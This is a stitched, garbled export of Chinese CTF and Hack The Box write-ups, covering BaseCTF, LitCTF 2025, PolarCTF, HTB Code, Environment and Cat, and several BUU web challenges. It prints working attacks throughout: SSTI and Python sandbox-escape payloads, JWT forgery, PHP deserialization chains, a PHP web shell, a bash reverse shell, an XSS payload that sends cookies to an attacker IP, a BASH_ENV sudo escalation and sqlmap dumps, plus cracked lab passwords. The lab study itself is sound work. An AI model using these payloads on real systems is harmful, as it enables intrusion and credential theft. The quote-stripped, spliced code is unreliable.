可以得到部分源码 BLACKLIST_IN_index = [,]def merge(src, dst): for k, v in src.items(): if hasattr(dst, __getitem__): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)@app.route(/magic,methods=[POST, GET])def pollute(): if request.method == POST: if request.is_json: merge(json.loads(request.data), instance) return 这个魔术还行吧 else: return 我要json的魔术 return 记得用POST方法把魔术交上来 ssti禁止了{和}，就这点来说不能进行ssti了，但是我们还有一个magic路径没用，在magic路由下污染jinja的语法标识符 __init__ : __globals__ : app : jinja_env :variable_start_string : ,variable_end_string: 再在index路径下进行正常的ssti注入就可 lipsum.__globals__.__builtins__.__import__(os).popen(cat /flag).read() flag:BaseCTF5e4b7b9a-ce09-49f0-8e43-4efca0964ebd No JWT给了源码 from flask import Flask, request, jsonifyimport jwtimport datetimeimport osimport randomimport stringapp = Flask(__name__)# 随机生成 secret_keyapp.secret_key = .join(random.choices(string.ascii_letters + string.digits, k=16))# 登录接口@app.route(/login, methods=[POST])def login(): data = request.json username = data.get(username) password = data.get(password) # 其他用户都给予 user 权限 token = jwt.encode( sub: username, role: user, # 普通用户角色 exp: datetime.datetime.utcnow() + datetime.timedelta(hours=1) , app.secret_key, algorithm=HS256) return jsonify(token: token), 200# flag 接口@app.route(/flag, methods=[GET])def flag(): token = request.headers.get(Authorization) if token: try: decoded = jwt.decode(token.split( )[1], options=verify_signature: False, verify_exp: False) # 检查用户角色是否为 admin if decoded.get(role) == admin: with open(/flag, r) as f: flag_content = f.read() return jsonify(flag: flag_content), 200 else: return jsonify(message: Access denied: admin only), 403 except FileNotFoundError: return jsonify(message: Flag file not found), 404 except jwt.ExpiredSignatureError: return jsonify(message: Token has expired), 401 except jwt.InvalidTokenError: return jsonify(message: Invalid token), 401 return jsonify(message: Token is missing), 401if __name__ == __main__: app.run(debug=True) 一眼JWT伪造，首先去login拿到原始token 找一个网站https://www.bejson.com/jwt/ 将role改为admin即可 GET /flag HTTP/1.1Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzYXV5Iiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzUyNDgzMDc3fQ.T9JaxnAd3WpQucobpUiDPYl52FqfnNiZ7frMu-rCrSs flag:BaseCTFd1d644ea-e932-4db8-a1df-e7be8b450e0d RCEisamazingwithspace简单的RCE绕过空格 ${IFS} POST:cmd=cat$IFS/flag flag:BaseCTF50ef1244-a571-48dc-84f4-0a3cfe832b3c Really EZ POP很简单的pop链子 ?phpclass Sink private $cmd = system(cat /flag);;class Shark private $word; public function __construct() $this - word = new Sink(); class Sea public $animal; public function __construct() $this-animal = new Shark(); class Nature public $sea; public function __construct() $this - sea = new Sea(); $a = new Nature();echo urlencode(serialize($a));? 唯一注意就是private属性外部不可调用 only one sql?phphighlight_file(__FILE__);$sql = $_GET[sql];if (preg_match(/select|;|@| /i, $sql)) die(你知道的，不可能有sql注入);if (preg_match(/|\\$|`|\\\\\\\\/i, $sql)) die(你知道的，不可能有RCE);//flag in ctf.flag$query = mysql -u root -p123456 -e \\use ctf;select 没有select，让你执行一句又如何; . $sql . \\;system($query); 可以用show 来查询 database table column 其他的 Readme|not solve源码是 ?phpfile_get_contents($_POST[file]); 和之前的不一样 之前的echo有回显 但是这次没有 那么这个就要想办法读取到文件的内容 再来打CVE-2024-2961 那么没回显怎么办捏 这里使用侧信道读取文件内容 这样就可以绕过无回显的限制 文章:https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle https://tttang.com/archive/1395/ 工具项目:https://github.com/synacktiv/php_filter_chains_oracle_exploit python3 22.py --target http://url/ --file /etc/passwd --parameter file 能读到文件 但是速度太慢了 改了脚本也是很慢 反正后面结合cnext来做","tags":["CTF-wp"]},{"title":"LitCTF 2025 复现","path":"/2025/07/07/LitCTF2025wp/","content":"[LitCTF 2025]easy_fileF12源代码 script const particlesContainer = document.getElementById(particles); for (let i = 0; i 30; i++) const particle = document.createElement(div); particle.className = particle; particle.style.width = `$Math.random() * 20 + 5px`; particle.style.height = particle.style.width; particle.style.left = `$Math.random() * 100%`; particle.style.top = `$Math.random() * 100%`; particle.style.animationDelay = `$Math.random() * 5s`; particlesContainer.appendChild(particle); document.getElementById(loginForm).addEventListener(submit, function(e) e.preventDefault(); const username = this.querySelector(input[name=username]).value; const password = this.querySelector(input[name=password]).value; const encoder = new TextEncoder(); const encode = str = btoa(String.fromCharCode(...encoder.encode(str))); this.querySelector(input[name=username]).value = encode(username); this.querySelector(input[name=password]).value = encode(password); this.submit(); ); //file查看头像/script 有查看jpg的点 进去就是登录框 首先尝试弱口令 用户名照常admin 密码随便猜的弱密码 虽然错误但是发现回到登陆页面它给你填好了帐号 YWRtaW4是admin的base64 所以我们猜测帐号密码应该都是base64过后的弱口令 然后你抓包也能知道他是base64编码 burp字典爆破即可 爆破出来为password 登陆进去是文件上传的点 只能上传txt和jpg 如果只能上传jpg上传个图片马看看 检测php使用短标签 图片马条件是必须有文件包含 刚好这里前面源代码有一个file查看图片 [LitCTF 2025]君の名は进去就是php代码 反序列化 ?phphighlight_file(__FILE__);error_reporting(0);create_function(, die(`/readflag`););class Taki private $musubi; private $magic; public function __unserialize(array $data) $this-musubi = $data[musubi]; $this-magic = $data[magic]; return ($this-musubi)(); public function __call($func,$args) (new $args[0]($args[1]))-$this-magic(); class Mitsuha private $memory; private $thread; public function __invoke() return $this-memory.$this-thread; class KatawareDoki private $soul; private $kuchikamizake; private $name; public function __toString() ($this-soul)-flag($this-kuchikamizake,$this-name); return call error!no flag!; $Litctf2025 = $_POST[Litctf2025];if(!preg_match(/^[Oa]:[\\d]+/i, $Litctf2025)) unserialize($Litctf2025);else echo 把O改成C不就行了吗,笨蛋!～(∠・ω )⌒☆; 这是道很好的题 对不擅长php序列化的师傅有点难理解 但请耐心看完 首先先找最后获取flag的点是 create_function(“”, ‘die(/readflag);’); 创造了一个匿名的函数来执行读取flag的操作 所以我们要读取flag就得通过反序列化调用这个匿名函数。 所以现在有几个点需要解决: 1.匿名函数的名字 2.怎么调用匿名函数 3.绕过最后一步 1. ?php $a = create_function(,die(` /readflag`););var_dump($a);#\\000lambda_1 输出就是其名字 但是网页每刷新一次 函数名后的数字就会加1 2. 链子顺序很简单,是: Taki::__unserialize-Mitsuha::__invoke-KatawareDoki::__toString-Taki::__call 仔细看 public function __call($func,$args) (new $args[0]($args[1]))-$this-magic(); new $args[0]($args[1])用调用时传入的第一个参数 $args[0] 作为类名，动态创建这个类的实例。用第二个参数 $args[1] 作为该类构造函数的参数。 -$this-magic()调用新实例中，名字为 $this-magic 的方法，且无参数。 所以这里考了原生类的知识点 使用ReflectionFunction的invoke方法调用无参函数 理解: $rf = new ReflectionFunction($closure);$rf-invoke() 意为调用$closure这个函数。那么回到此题，即是调用lambda_1这个函数，读到flag。 $fun会被赋值为flag(),$args则是flag()里的东西 3. 绕过使用类对链子进行包装，这样开头的O就会替换为C，以此绕过。以下这些原生类是C开头 ArrayObject::unserializeArrayIterator::unserializeRecursiveArrayIterator::unserializeSplDoublyLinkedList::unserializeSplQueue::unserializeSplStack::unserializeSplObjectStorage::unserialize POP链: ?phpclass Taki public $musubi; public $magic = invoke;class Mitsuha public $memory; public $thread;class KatawareDoki public $soul; public $kuchikamizake = ReflectionFunction; public $name = \\000lambda_1;$a = new Taki();$b = new Mitsuha();$c = new KatawareDoki();$a - musubi = $b;$b - thread = $c;$c - soul = $a;$d = array(sauy=$a); //这里随便取一个键名就好，意义就是搞成数组$e = new ArrayObject($d); //使用原生类进行封装来进行绕过echo urlencode(serialize($e));?#Litctf2025=C%3A11%3A%22ArrayObject%22%3A244%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22sauy%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D 请注意本题php版本是php7.4 但是运行链子请在PHP 5.3版本下运行（推荐使用phpstudy 切换php版本方便) 原因是：PHP版本差异导致的ArrayObject序列化格式变化。在PHP 5.6+及更高版本中，ArrayObject的序列化结构包含三部分（标志位、存储数组、迭代器信息），而旧版PHP（如5.3）则使用不同的自定义格式（以C:开头）–来自DEEPSEEK https://chenxi9981.github.io/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/ (php序列化知识总结)","tags":["CTF-wp"]},{"title":"HTB-wp","path":"/2025/07/06/HTB-Practice/","content":"HTB-codeusernmap扫描 nmap 10.10.11.62 -sV -A 发现开放了5000端口 访问发现是个在线执行python代码的网页 可以进行命令执行 print(.__class__.__base__.__subclasses__()[317](ls /,shell=True,stdout=-1).communicate()[0].strip()) 然后直接在上层目录读到user.txt print(.__class__.__base__.__subclasses__()[317](cat ../user.txt,shell=True,stdout=-1).communicate()[0].strip()) root命令执行 print(.__class__.__base__.__subclasses__()[317](ls *,shell=True,stdout=-1).communicate()[0].strip())#bapp.pyinstance: database.db __pycache__: app.cpython-38.pyc static: css templates: about.html codes.html index.html login.html register.html 发现有instance下有database.db 读一下试试看 于是可以拿到 martin的hash加密后的密码 3de6f30c4a09c27fc71932bfc68474be 就是 nafeelswordsmaster 然后使用ssh登录 ssh martin@10.10.11.62 提示输入密码 输入就好了 输入sudo -l 回显 martin@code:~$ sudo -lMatching Defaults entries for martin on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser martin may run the following commands on localhost: (ALL : ALL) NOPASSWD: /usr/bin/backy.sh backy.sh文件内容： 内容大概为三个功能：1.输入检查，必须传入一个 JSON 文件路径（如 task.json），否则报错。检查文件是否存在。2.路径过滤使用,jq 移除 directories_to_archive 中所有 ..（防止目录遍历攻击）。允许的路径范围限定在 var 和 home。3.路径权限检查,is_allowed_path() 函数检查路径是否以 var 或 home 开头（防止访问敏感路径如 root）。 #!/bin/bashif [[ $# -ne 1 ]]; then /usr/bin/echo Usage: $0 task.json exit 1fijson_file=$1if [[ ! -f $json_file ]]; then /usr/bin/echo Error: File $json_file not found. exit 1fiallowed_paths=(/var/ /home/)updated_json=$(/usr/bin/jq .directories_to_archive |= map(gsub(\\\\.\\\\./; )) $json_file)/usr/bin/echo $updated_json $json_filedirectories_to_archive=$(/usr/bin/echo $updated_json | /usr/bin/jq -r .directories_to_archive[])is_allowed_path() local path=$1 for allowed_path in $allowed_paths[@]; do if [[ $path == $allowed_path* ]]; then return 0 fi done return 1for dir in $directories_to_archive; do if ! is_allowed_path $dir; then /usr/bin/echo Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed. exit 1 fidone/usr/bin/backy $json_file task.json 其主要功能是过滤路径并检查允许的目录，先执行一下backy.sh，发现会生成一个压缩包 destination: /home/martin/backups/, multiprocessing: true, verbose_log: false, directories_to_archive: [ /home/app-production/app ], exclude: [ .* ] 做法：将备份目录修改为home….root 并且要删除exclude: [“.*”] 为什么要删除？exclude: [.*]导致/root文件夹被完全排除 destination: /home/martin/backups/, multiprocessing: true, verbose_log: false, directories_to_archive: [ /home/....//root ] sudo /usr/bin/backy.sh task.json 执行ls 发现生成了压缩包 使用tar -xjf code_home_.._root_2025_April.tar.bz2 再ls 发现生成了root目录 进root目录读root.txt即可 HTB-Environment惯例nmap先扫描10.10.11.67 nmap 10.10.11.67 -sV -A 没什么特别的 常见的22和80端口 直接访问 记得配host echo 10.10.11.67 environment.htb | sudo tee -a /etc/hosts 访问后 进入网站界面 没发现什么特别的 也没有可以点的东西 上dirsearch扫描看看 扫出来登录路由 进去尝试登录 发现没什么用 抓包下登录界面 改下参数就出了报错界面 (这一步我是看wp才知道的 告诉我们要多试试) user $keep_loggedin = False; elseif ($remember == True) $keep_loggedin = True;if($keep_loggedin !== False) // TODO: Keep user logged in if he selects Remember Me?if(App::environment() == preprod) //QOL: login directly as me in dev/local/preprod envs $request-session()-regenerate(); $request-session()-put(user_id, 1); return redirect(/management/dashboard);$user = User::where(email, $email)-first(); 然后这里就有可以利用的点了 if(App::environment() == preprod) $request-session()-regenerate(); $request-session()-put(user_id, 1); return redirect(/management/dashboard); 这一段代码意思是 :当运行环境为 preprod 时，直接把 session 中的 user_id 设置为 1，并重定向到后台(常常用于开发者想偷懒直接让自己登陆的) 所以如果我们想登录满足这个就好 找到相关的CVE “https://github.com/Nyamort/CVE-2024-52301“ 按照poc去打于是成功进入后台了！ 在profile里找到一个上传文件的点 进行绕过 加GIF89a 以及后缀加一个. 上传文件成功！然后连接antsword 然后就可以拿到第一个flag了 root然后其实最好的做法是反弹shell 接下来我们打root也方便 cmdbash+-c+%27bash+-i+%3E%26+devtcpip1234+0%3E%261%27 反弹shell成功后切换到 homehish目录 发现了.gnupg目录 此时www-data用户是没有权限对hish用户进行解密的，但是我们可以尝试复制hish用户的gpg私钥进行解密 .gnupg 是 GnuPG（GPG） 的配置与密钥目录，用于管理用户的加密密钥、配置文件、缓存等数据。 GPG 是 GNU 的 PGP 实现，主要用于：加密/解密文件签名文件/验证签名生成/导入/管理加密密钥 首先把这个文件备份到其他目录 cp -r /home/hish/.gnupg/* /tmp/mygpg/ 然后进入backup目录进行解密 gpg --homedir /tmp/mygpg --decrypt keyvault.gpg up$ gpg --homedir /tmp/mygpg --decrypt keyvault.gpggpg: WARNING: unsafe permissions on homedir /tmp/mygpggpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11 hish_ hish@environment.htbPAYPAL.COM - Ihaves0meMon$yhere123ENVIRONMENT.HTB - marineSPm@ster!!FACEBOOK.COM - summerSunnyB3ACH!! 然后按照hish用户登录 登陆过后 sudo -l得到 Matching Defaults entries for hish on environment: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=ENV BASH_ENV, use_ptyUser hish may run the following commands on environment: (ALL) /usr/bin/systeminfo env_keep+=ENV BASH_ENV 允许设置 BASH_ENV 环境变量，即允许通过该变量劫持 bash 启动时执行的脚本。 User hish may run the following commands: 可以使用 sudo 运行 /usr/bin/systeminfo（以 root 权限） 用 sudo 执行一个 bash 脚本（systeminfo），而 bash 会自动加载你用 BASH_ENV 注入的恶意脚本，从而实现以 root 权限执行任意命令！ 使用命令 echo exec /bin/bash /tmp/exploit.shsudo BASH_ENV=/tmp/exploit.sh /usr/bin/systeminfo//输入marineSPm@ster!! 即可成功登录 HTB-Cat还是nmap先扫描 正常开放22和80端口 配个host先 echo 10.10.11.53 cat.htb | sudo tee -a /etc/hosts 访问是个网站 有注册点 登陆进去找到一个可以文件上传的点 尝试了下发现没有可利用的点 因为是白名单 只能传图片 于是dirsearch继续信息收集 结果扫出来一堆.git的目录 user使用Githack获取源代码 然后开始审计吧 有很多个php文件 但是其实跟我现在做的网站有关的只有部分 剩下的比如admim.php accept_cat.php 等 我们暂时在网站中还没见到 但是你审计这些代码后就会发现 这个网站还有一个admin的存在并且使用session来验证是否为admin 当你上传你的猫儿资料过后 admin会来查看 它可以进行查看 接收 拒绝的操作(对应三个php代码) 所以我们很容易联想到xss的一类攻击手法 窃取管理员cookie伪造其登录 这里审计出大概存在xss 去这六个东西对应的php文件 最终锁定了注入点在登录框 注册帐号为img src=x onerror=document.location=http://10.10.14.58/?cookie=+document.cookie / 密码随便 进入上传猫咪资料的界面上传 同时开启监听 python3 -m http.server 80 成功拿到admin的cookie！ 修改cookie后成功进入admin页面 抓包 这里有sql注入漏洞 使用sqlmap进行注入 将reqeust保存为1.txt 然后使用sqlmap注入得到数据库 sqlmap -r request.txt -p catName --dbms sqlite --level 5 --risk 3 --tables --threads 10 --batchsqlmap -r request.txt -p catName --dbms sqlite --level 5 --risk 3 -T users --dump --threads 10 --batch 由源码知道使用axel登录 但是这个密码我没办法破解 尝试后rosa的密码可以知道 ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa 登录到这个用户 但是我们的核心目的还是登录axel 想办法拿到他的密码 发现rosa 还属于 adm 组（GID 4），通常用于系统日志访问权限。我们去看看日志吧 日志一般在varlog下 然后成功找到密码 使用ssh登录axel即可 然后在目录下找到user.txt成功读取 root登录axel的时有 说我有邮件 那就去看看什么邮件 HTB┌──(kali㉿kali)-[~/Desktop]└─$ nmap 10.10.11.87 -sU --top-ports 100sh: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8): No such file or directoryStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 04:05 EDTNmap scan report for 10.10.11.87Host is up (0.15s latency).Not shown: 95 closed udp ports (port-unreach)PORT STATE SERVICE68/udp open|filtered dhcpc69/udp open|filtered tftp500/udp open isakmp2049/udp open|filtered nfs4500/udp open|filtered nat-t-ikeNmap done: 1 IP address (1 host up) scanned in 151.58 seconds","tags":["渗透学习"]},{"title":"2025年夏季个人挑战赛PolarCTF-WEB","path":"/2025/06/29/2025年夏季个人挑战赛PolarCTF-WEB/","content":"ez_checkjava题暂时不会 狗黑子的变量考点:截取和拼接$PATH中的字符构造命令 构造方法: $PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin$PATJl/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 构造ls这个命令的结果 $PATH:5:1 //l$PATH:2:1 //s$PATH:5:1$PATH:2:1 //ls//第一个字母代表PATH里的第几个字符，从0开始，和数组一样 第二个是代表截取几个字符 dirsearch扫描 扫出admin.php 可以看到PATH的内容 于是乎就开始拼接要被替换的字母 $PATH:8;1at /* cat * 狗黑子的隐藏进去只有一个刷新按钮 dirsearch也没有看出东西 F12习惯 看到cmd参数 执行命令 成功 禁了 env看看 直接出假flag！！！！！！！！ ctrl+u得到源码 1\t?php 2\t// 检查是否有POST请求且包含cmd参数 3\tif ($_SERVER[REQUEST_METHOD] === POST isset($_POST[cmd])) 4 $cmd = $_POST[cmd]; 5 6 // 强制切换到当前目录（重要安全措施） 7 chdir(dirname(__FILE__)); 8 9 // 过滤危险字符和关键字10 $blacklist = array(f,g,cat, flag, , |, `,,,in,nd,de,ex,head,tac,le,ss,mo,re,..,/,\\\\);11 $is_dangerous = false;12 13 // 检查命令是否包含黑名单中的任何项14 foreach ($blacklist as $item) 15 if (stripos($cmd, $item) !== false) 16 $is_dangerous = true;17 break;18 19 20 21 // 如果检测到危险操作，回显错误信息22 if ($is_dangerous) 23 echo 不支持危险操作;24 else 25 // 检查过滤后的命令是否为空26 if (!empty($cmd)) 27 // 执行过滤后的命令28 system($cmd);29 30 31\t32\t? 直接写木马吧 cmd=echo ?php @eval($_POST[a]);? a.php antsword连接成功 执行命令即可 简单的链子好简单的菜鸟反序列化 ?phpclass A public $cmd = cat /flag; function __destruct() if (isset($this-cmd)) system($this-cmd); $a = new A();echo serialize($a);? 渗透之王首先进去是登录界面 帐号admin 随便猜了一个弱口令 提示密码错误 自己拿字典去爆也没爆出来 于是dirsearch扫了一下目录 得到有用的两个路径 访问admin.php得到base64加密的密文 解密后为polarctf www.zip源码泄露 下载下来发现需要密码 于是输入polarctf 成功解密 打开发现是个弱密码字典 于是我们就使用他的字典 爆出来密码是admin789 成功登录 进入界面点击发现提示非法的文件包含 那就是文件包含 /polarctf/?page=php://filter/convert.base64-encode/resource=about.php /polarctf/?page=php://filter/convert.base64-encode/resource=hint.php 提示有文件上传界面 现在就是找文件上传入口 这里你可以dirsearch扫 扫出来文件上传路径 很简单的文件上传 改一下content-type即可 antsword连接即可 真假ECR非预期: 进去就是源代码 禁了一些指令 但是你可以使用转义绕过 ?cmd=ca\\t /fla\\g 预期: 先访问flag.php 得到 KeY=aGVpZ291emk= USERID=p8Sjk58 DATA=2JSklNA= 如果这也不明白的话，加上后缀试一试 第一个解码后得到heigouzi 带上后缀php可以访问 参数应该也是cmd 执行命令ls 发现能够读取到这个网站的文件 cainiao.txtflag.phpheigouzi.phpindex.phpshe11.php 查看cainiao.txt 是个解密函数 用就好 数据:KeY=aGVpZ291emk= USERID=p8Sjk58 DATA=2JSklNA= ?phpclass Decryption public function decrypt($data, $key) $char = ; $str = ; $key = md5($key); $x = 0; $data = base64_decode($data); $len = strlen($data); $l = strlen($key); for ($i = 0; $i $len; $i++) if ($x == $l) $x = 0; $char.= substr($key, $x, 1); $x++; for ($i = 0; $i $len; $i++) $str.= chr(ord($data[$i]) - ord($char[$i])); return $str; $data = 2JSklNA=;$key = answer; $decryption = new Decryption();$result = $decryption-decrypt($data, $key);echo $result;? 解密出来是wanan 是she11.php的密码 antsword连接即可 nukaka_ser2没什么好说的 反序列化审链子 看起来很长 其实一下就做出了 pop链子如下 ?phpclass FlagReader private $logfile; protected $content;class DataValidator class FakeDanger private $buffer;class VulnerableClass public $logger; private $debugMode = true;$A = new VulnerableClass();$A - logger = new FlagReader();echo base64_encode(serialize($A));? ghost_render说是md渲染 抓包自己burp尝试 渲染我就想到ssti 测了下还真是 非常简单的ssti 没有过滤 直接执行命令即可 不过flag路径得首先去读取app.py才可以知道flag存储在varsecret_flag下 rce命令执行系统ls被过滤 试试转义 访问发f1ag.php得到 既然你找到这里了那就告诉你点东西吧 异或后它好像改名叫XOR_KEY，给他传个参试一试呢，对了，咱们的靶场叫什么来着？🤔 payload env XOR_KEYPolar easyRead嗯很简单的链子 但是拿flag很神经 flag我执行命令没找到 这道题flag是flag{HelloHellorun} exp ?phpClass Read public $source; public $is;class Help public $source; public $str;class Polar private $var = system(ls /);;class Doit public $is; private $source;$a = new Read(); $a1 = new Read();$a - source = $a1;$a1 - is = new Help();$a1 - is - str = new Doit();$a1 - is - str - is = new Polar();echo urlencode(serialize($a));? 命运石之门进去就是验证密码 ctrl+u发现提示 5pyJ5pe25YCZ77yM6aqM6K+B56CB5piv5ZCm5aW95L2/5LiN6YeN6KaB 然后dirsearch扫描发现 passwrod.txt 直接burp开爆 验证码说是不重要 随便填 结果还是要猜万能验证码0000 直接进第二步 还是爆密码 字典是拿到的password.txt内容 爆出来密码是 huan9le1Sam0 直接过人机验证即可得到flag 你也玩铲吗首先先注册 登陆进去看到ctrl+u看到提示 dirsearch扫描 扫描出来好几个敏感路径 访问login_admin.html 看到管理员登录界面 结合提示 伪造cookie 修改cookie如下图 再去访问admin_login.php","tags":["CTF-wp"]},{"title":"web刷题——持续更新","path":"/2025/06/09/BUU-刷题/","content":"[第五空间 2021]PNG图片转换器有源码，ruby写的，不是常见的语言首先联想cve，先看源码。 require sinatrarequire digestrequire base64get / do open(./view/index.html, r).read()endget /upload do open(./view/upload.html, r).read()endpost /upload do unless params[:file] params[:file][:tempfile] params[:file][:filename] params[:file][:filename].split(.)[-1] == png return scriptalert(error);location.href=/upload;/script end begin filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + .png open(filename, wb) |f| f.write open(params[:file][:tempfile],r).read() Upload success, file stored at #filename rescue something wrong endendget /convert do open(./view/convert.html, r).read()endpost /convert do begin unless params[file] return scriptalert(error);location.href=/convert;/script end file = params[file] unless file.index(..) == nil file.index(/) == nil file =~ /^(.+)\\.png$/ return scriptalert(dont hack me);/script end res = open(file, r).read() headers Content-Type = text/html; charset=utf-8 var img = document.createElement(\\img\\); img.src= \\data:image/png;base64, + Base64.encode64(res).gsub(/\\s*/, ) + \\; rescue something wrong endend 做了两个功能点，upload和convert。审计下来限制的很死，唯一利用点就是open这比较可疑，考虑cve，ruby结合open果然有cve。 参考CVE-2017-17405 https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/middleware/Ruby-NetFTP-%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2017-17405.md 原理: Ruby-Net::FTP 模块是一个FTP客户端，上传文件过程中使用了open函数。open函数在ruby中是借用系统命令来打开文件，意味着如果没有做过滤，我们能利用这个点来执行命令。 payload: 如果+path+以一个管道字符（|）开头，就会创建一个子进程，通过一对管道连接到调用者。 返回的IO对象可用于向该子进程的标准输入写入和从标准输出读取。 file=|bash -c env #.pngfile=|`echo ZW52|base64 -d` e7e7eed2fbf6094265aebdf5344bfb8c.pngfile=|bash$IFS-c$IFSecho,YmFzaCAtaSA...|base64,-d|bash,-i [网鼎杯 2018]Fakebook进去没找到什么利用点，dirsearch扫描，有robots.txt 访问得到user.php.bak ?phpclass UserInfo public $name = ; public $age = 0; public $blog = ; public function __construct($name, $age, $blog) $this-name = $name; $this-age = (int)$age; $this-blog = $blog; function get($url) $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) return 404; curl_close($ch); return $output; public function getBlogContents () return $this-get($this-blog); public function isValidBlog () $blog = $this-blog; return preg_match(/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]2,6(\\:[0-9]+)?(\\/\\S*)?$/i, $blog); [网鼎杯 2020 朱雀组]phpweb进去就是一张贴脸大图 随便抓包看到参数 随便输发现 call_user_fun这个超明显的php函数 首先使用file_get_contents结合伪协议读取源码 (读源码不止一个方法 还有funhighlight_filepindex.php) ?php$disable_fun = array(exec,shell_exec,system,passthru,proc_open,show_source,phpinfo,popen,dl,eval,proc_terminate,touch,escapeshellcmd,escapeshellarg,assert,substr_replace,call_user_func_array,call_user_func,array_filter, array_walk, array_map,registregister_shutdown_function,register_tick_function,filter_var, filter_var_array, uasort, uksort, array_reduce,array_walk, array_walk_recursive,pcntl_exec,fopen,fwrite,file_put_contents); function gettime($func, $p) $result = call_user_func($func, $p); $a= gettype($result); if ($a == string) return $result; else return ; class Test var $p = Y-m-d h:i:s a; var $func = date; function __destruct() if ($this-func != ) echo gettime($this-func, $this-p); $func = $_REQUEST[func]; $p = $_REQUEST[p]; if ($func != null) $func = strtolower($func); if (!in_array($func,$disable_fun)) echo gettime($func, $p); else die(Hacker...); ? 这里有两个方法: 方法1：unserilize反序列化__destruc__魔术方法当类被销毁会自动触发 ?phpclass Test var $p = find / -name flag*; var $func = system;$a = new Test;echo serialize($a);? 看到可疑路径 tmpflagoefiu4r93 ?phpclass Test var $p = cat /tmp/flagoefiu4r93; var $func = system;$a = new Test;echo serialize($a);? 得道flag 方法2：命名空间方法原理在php中，函数加上\\号不会影响函数本身，因为in_array函数过滤不够严谨，所以我们可以利用加上\\号来绕过。 func\\systempfind -name fllag* 然后正常执行命令就行 [安洵杯 2019]easy_serialize_php?php$function = @$_GET[f];function filter($img) $filter_arr = array(php,flag,php5,php4,fl1g); $filter = /.implode(|,$filter_arr)./i; return preg_replace($filter,,$img);if($_SESSION) unset($_SESSION);$_SESSION[user] = guest;$_SESSION[function] = $function;extract($_POST);if(!$function) echo a href=index.php?f=highlight_filesource_code/a;if(!$_GET[img_path]) $_SESSION[img] = base64_encode(guest_img.png);else $_SESSION[img] = sha1(base64_encode($_GET[img_path]));$serialize_info = filter(serialize($_SESSION)); //得到序列化的数据if($function == highlight_file) highlight_file(index.php);else if($function == phpinfo) eval(phpinfo();); //maybe you can find something in here!else if($function == show_image) $userinfo = unserialize($serialize_info); //反序列化 echo file_get_contents(base64_decode($userinfo[img])); //取出序列化数据中的base64_encode过后的img先进行decode再进行读取文件内容//所以是$_SESSION序列化后被filter函数处理，再反序列化赋给userinfo，最后取出img这个键对应的值 代码理解理解代码在干什么很重要，审计代码的能力很重要。 这段php代码首先定义了一个名为filter函数，它会把传入的变量的值如果在它定义的数组里，就会把符合条件的字符串替换为空。 然后使用了变量覆盖里常用的函数extract来使我们$_SESSION[user]和$_SESSION[function]通过POST可控。 然后if判断是否传入img_path,没传入就是设置为guest_image.png,传入的话就会使用一个不可逆的sha1算法，所以我们肯定不考虑这个。 下一步是定义变量serialize_info为经过filter函数操作后的序列化后的数据。 再下来是if选择function功能 highlight_file是查看源码，phpinfo是查看phpinfo，show_image是做了一个反序列化操作，并且使用了一个敏感函数，file_get_contens。 题目做法：反序列化字符逃逸一共有两种方法：一个是键值逃逸，另一个是键名逃逸flag路径在phpinfo功能点就能看到 为d0g3_fllllllag 方法1：键值逃逸代码审计完了，有反序列化又有替换的操作，很容易联想到字符串逃逸。这里只有user和function可控。为了好理解我们先看序列化后的数据长什么样子。 ?php$_SESSION[user] = *;$_SESSION[function] = **;$_SESSION[img] = base64_encode(guest_img.png);echo serialize($_SESSION);?//a:3:s:4:user;s:2:aa;s:8:function;s:2:bb;s:3:img;s:20:Z3Vlc3RfaW1nLnBuZw==; 因为要让guest_img.png逃逸出去，所以我们应该修改user，让user经过字符串替换，function这个变量及其值成为user的值，img变量变为我们想要的值哦。 function应该为值为;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA”;} fileter处理前:a:3:{s:4:”user”;s:22:”phpphpphpflagphpphpphp”;s:8:”function”;s:56:”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA”;s:1:”a”;s:1:”a”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw”;} ?php$_SESSION[user] = 